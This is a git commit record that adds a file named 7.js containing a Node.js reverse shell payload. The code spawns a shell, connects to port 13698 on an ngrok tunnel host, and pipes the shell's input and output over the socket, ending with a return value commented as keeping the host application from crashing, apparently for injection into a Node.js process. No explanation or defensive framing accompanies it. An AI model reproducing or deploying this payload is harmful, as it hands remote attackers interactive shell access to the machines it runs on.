3a74e8ecd1e18d66529f08dfea326c2f7569be22
yazarneon <46387832+yazarneon@users.noreply.github.com>
2022-06-17 18:00:12 -0400

    Create 7.js

---
+++ 7.js
@@ -0,0 +1,12 @@
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(13698, "0.tcp.ngrok.io", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
